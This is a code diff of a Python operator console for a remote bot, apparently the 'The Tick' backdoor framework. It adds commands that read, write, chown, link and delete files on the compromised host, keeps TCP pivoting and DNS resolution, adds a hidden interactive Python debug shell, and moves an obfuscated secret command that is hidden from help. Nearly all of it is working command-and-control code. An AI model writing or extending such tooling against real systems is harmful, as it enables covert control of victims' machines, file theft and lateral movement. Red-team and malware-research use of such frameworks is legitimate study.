@@ -31,6 +31,7 @@ import os.path
 import ssl
 import posixpath
 import ntpath
+import code
 
 # More standard imports...
 from socket import *
@@ -47,6 +48,7 @@ from time import sleep
 from functools import wraps
 from multiprocessing import Process
 from subprocess import check_output
+from collections import namedtuple
 
 # This is our first dependency and we check it now so
 # we know if we can use colors to show errors later.
@@ -282,9 +284,22 @@ CMD_FILE_PUSH           = BASE_CMD_FILE + 1     # formerly CMD_FILE_WRITE
 CMD_FILE_UNLINK         = BASE_CMD_FILE + 2     # formerly CMD_FILE_DELETE
 CMD_FILE_EXEC           = BASE_CMD_FILE + 3
 CMD_FILE_CHMOD          = BASE_CMD_FILE + 4
+CMD_FILE_OPEN           = BASE_CMD_FILE + 5     # the following were added in v0.2
+CMD_FILE_READ           = BASE_CMD_FILE + 6
+CMD_FILE_WRITE          = BASE_CMD_FILE + 7
+CMD_FILE_STAT           = BASE_CMD_FILE + 8
+CMD_FILE_READDIR        = BASE_CMD_FILE + 9
+CMD_FILE_READLINK       = BASE_CMD_FILE + 10
+CMD_FILE_SYMLINK        = BASE_CMD_FILE + 11
+CMD_FILE_LINK           = BASE_CMD_FILE + 12
+CMD_FILE_RMDIR          = BASE_CMD_FILE + 13
+CMD_FILE_MKDIR          = BASE_CMD_FILE + 14
+CMD_FILE_CHOWN          = BASE_CMD_FILE + 15
+CMD_FILE_ACCESS         = BASE_CMD_FILE + 16
+CMD_FILE_STATVFS        = BASE_CMD_FILE + 17
 
 # Network commands.
-#CMD_HTTP_DOWNLOAD       = BASE_CMD_NET + 0  # deprecated since Apr 2021
+#CMD_HTTP_DOWNLOAD       = BASE_CMD_NET + 0  # deprecated in v0.2
 CMD_DNS_RESOLVE         = BASE_CMD_NET + 1
 CMD_TCP_PIVOT           = BASE_CMD_NET + 2
 
@@ -336,6 +351,7 @@ def get_resp_header(sock):
         raise BotError("disconnected")
     status, data_len = unpack("!BL", status + data_len)
     if status == CMD_STATUS_ERROR:
+        msg = ""
         if data_len > 0:
             msg = recvall(sock, data_len)
             if len(msg) != data_len:
@@ -719,6 +735,11 @@ class Bot(object):
     #
 
     @bot_action
+    def nop(self):
+        self.sock.sendall( build_command(CMD_NOP) )
+        get_resp_no_data(self.sock)
+
+    @bot_action
     def system_exit(self):
         self.sock.sendall( build_command(CMD_SYSTEM_EXIT) )
         get_resp_no_data(self.sock)
@@ -770,6 +791,92 @@ class Bot(object):
     def file_chmod(self, remote_file, mode_flags = 0o777):
         self.sock.sendall( build_command(CMD_FILE_CHMOD, pack("!H", mode_flags) + remote_file) )
         get_resp_no_data(self.sock)
+
+    @bot_action
+    def file_open(self, remote_file, flags = os.O_RDWR, mode = 0o777):
+        self.sock.sendall( build_command(CMD_FILE_OPEN, pack("!H", flags) + pack("!H", mode) + remote_file) )
+        resp = get_resp_with_data(self.sock)
+        return unpack("!H", resp)[0]
+
+    @bot_action
+    def file_read(self, remote_file, size, offset = 0):
+        self.sock.sendall( build_command(CMD_FILE_READ, pack("!L", size) + pack("!L", offset) + remote_file) )
+        return get_resp_with_data(self.sock)
+
+    @bot_action
+    def file_write(self, remote_file, data, offset = 0):
+        self.sock.sendall( build_command(CMD_FILE_WRITE, pack("!L", offset) + remote_file, data) )
+        get_resp_no_data(self.sock)     # TODO review this
+
+    @bot_action
+    def file_stat(self, remote_path):
+        self.sock.sendall( build_command(CMD_FILE_STAT, remote_path) )
+        data = get_resp_with_data(self.sock)
+        resp = namedtuple('RESP_FILE_STAT', ('dev', 'ino', 'mode', 'nlink', 'uid', 'gid', 'rdev', 'size', 'blksize', 'blocks', 'atime', 'mtime', 'ctime'))
+        return resp(*(unpack("!QQQQQQQQQQQQQ", data)))
+
+    @bot_action
+    def file_readdir(self, remote_path):
+        self.sock.sendall( build_command(CMD_FILE_READDIR, remote_path) )
+        data = get_resp_with_data(self.sock).split("\0")
+        while "" in data:
+            data.remove("")
+        return data
+
+    @bot_action
+    def file_readlink(self, remote_file):
+        self.sock.sendall( build_command(CMD_FILE_READLINK, remote_file) )
+        return get_resp_with_data(self.sock)
+
+    @bot_action
+    def file_symlink(self, linkname, target):
+        self.sock.sendall( build_command(CMD_FILE_SYMLINK, linkname, target) )
+        get_resp_no_data(self.sock)
+
+    @bot_action
+    def file_link(self, linkname, target):
+        self.sock.sendall( build_command(CMD_FILE_LINK, linkname, target) )
+        get_resp_no_data(self.sock)
+
+    @bot_action
+    def file_rmdir(self, remote_path):
+        self.sock.sendall( build_command(CMD_FILE_RMDIR, remote_path) )
+        get_resp_no_data(self.sock)
+
+    @bot_action
+    def file_mkdir(self, remote_path):
+        self.sock.sendall( build_command(CMD_FILE_MKDIR, remote_path) )
+        get_resp_no_data(self.sock)
+
+    @bot_action
+    def file_chown(self, remote_file, uid = 0, gid = 0):
+        self.sock.sendall( build_command(CMD_FILE_CHOWN, pack("!L", uid) + pack("!L", gid) + remote_file) )
+        get_resp_no_data(self.sock)
+
+    @bot_action
+    def file_access(self, remote_file, mode_flags = 0o777):
+        self.sock.sendall( build_command(CMD_FILE_ACCESS, pack("!H", mode_flags) + remote_file) )
+        try:
+            get_resp_no_data(self.sock)
+            return True
+        except BotError, e:
+            if e.msg == "":
+                return False
+            raise
+
+    @bot_action
+    def file_statvfs(self, remote_path):
+        self.sock.sendall( build_command(CMD_FILE_STATVFS, remote_path) )
+        data = get_resp_with_data(self.sock)
+        resp = namedtuple('RESP_FILE_STAT', ('type', 'bsize', 'blocks', 'bfree', 'bavail', 'files', 'ffree', 'fsid', 'namelen', 'frsize', 'flags'))
+        left = data[:7*8]
+        middle = data[7*8:9*8]
+        right = data[9*8:]
+        joined = []
+        joined.extend(unpack("!QQQQQQQ", left))
+        joined.append(middle)
+        joined.extend(unpack("!QQQ", right))
+        return resp(*joined)
 
     @bot_action
     def dns_resolve(self, domain):
@@ -1211,6 +1318,9 @@ class Console(Cmd):
     # Header for help page.
     doc_header = 'Available commands (type help * or help <command>)'
 
+    # Undocumented commands. We don't want them showing up on help.
+    hidden = ["EOF", "dbg"]
+
     def __init__(self, args = ()):
 
         # This member will contain the currently selected bot.
@@ -1339,6 +1449,15 @@ class Console(Cmd):
             self.listener.kill()
         except Exception:
             print_exc()
+
+    # This prevents the help from showing the undocumented commands.
+    def get_names(self):
+        names = Cmd.get_names(self)
+        for undoc in self.hidden:
+            undoc = "do_" + undoc
+            if undoc in names:
+                names.remove(undoc)
+        return names
 
     # This method is called by the listener whenever a new bot connects.
     # It will show a message to the user right below the command prompt.
@@ -1540,6 +1659,10 @@ class Console(Cmd):
         # Quit the command intepreter.
         # The context manager will take care of cleaning up.
         return True
+
+    def do_EOF(self, line):
+        print()
+        return self.do_exit(line)
 
     def do_clear(self, line):
         """
@@ -2296,25 +2419,58 @@ class Console(Cmd):
         # Deselect the bot, since we know it's dead now.
         self.current = None
 
-    # Scary stuff below! :o)
-    if "play" in globals():
-        darknet = "tor"
-        filename = "malna.png"
-        bitcoins = 13
-        secret = "".join([x[1:].encode(darknet[::-1]+str(bitcoins)) for x in os.path.splitext(filename)])
-        del darknet
-        del filename
-        del bitcoins
-        def get_names(self):
-            secret = "do_" + Console.secret
-            names = Cmd.get_names(self)
-            if secret in names:
-                names.remove(secret)
-            return names
+    # Spawns a Python shell with some handy local variables.
+    # This is probably only useful for debugging.
+    def do_dbg(self, arg):
+        """
+    \x1b[32m\x1b[1mdbg\x1b[0m
 
+        Spawn a python interpreter with access to all of the console's internal
+        variables. Note that the console will be frozen while this runs.
+        """
+        banner = ('Python %s on The Tick %s\nType "help", "copyright", '
+                 '"credits" or "license" for more information.')
+        platform = sys.version
+        if " " in platform:
+            platform = platform[:platform.find(" ")]
+        banner = banner % (platform, TICK_VERSION)
+        local = {
+            '__name__'  : '__console__',
+            'exit'      : self._python_exit,
+            'self'      : self,
+            'arg'       : arg,
+        }
+        local.update(globals())
+        try:
+            code.interact(banner=banner, local=local)
+        except SystemExit:
+            # We need to catch it so it doesn't kill our program.
+            pass
+
+    # This hack fixes a bug in Python, the interpreter console is closing the
+    # stdin pipe when calling the exit() function (Ctrl+D/Ctrl+Z seems to work fine).
+    class _PythonExit(object):
+        def __repr__(self):
+            if os.path.sep == '/':
+                return "Use exit() or Ctrl-D (i.e. EOF) to exit"
+            return "Use exit() or Ctrl-Z plus Return to exit"
+        def __call__(self):
+            raise SystemExit()
+    _python_exit = _PythonExit()
+
+# Scary stuff below! :o)
 # Dunno about you reversing it but I had fun coding this :D
 if "play" in globals():
-    setattr(Console, "do_" + Console.secret, play)
+    darknet = "tor"
+    filename = "malna.png"
+    bitcoins = 13
+    secret = "".join([x[1:].encode(darknet[::-1]+str(bitcoins)) for x in os.path.splitext(filename)])
+    setattr(Console, "do_" + secret, play)
+    Console.hidden.append(secret)
+    del darknet
+    del filename
+    del bitcoins
+    del secret
 
 ##############################################################################
 # The bit that launches the console itself.
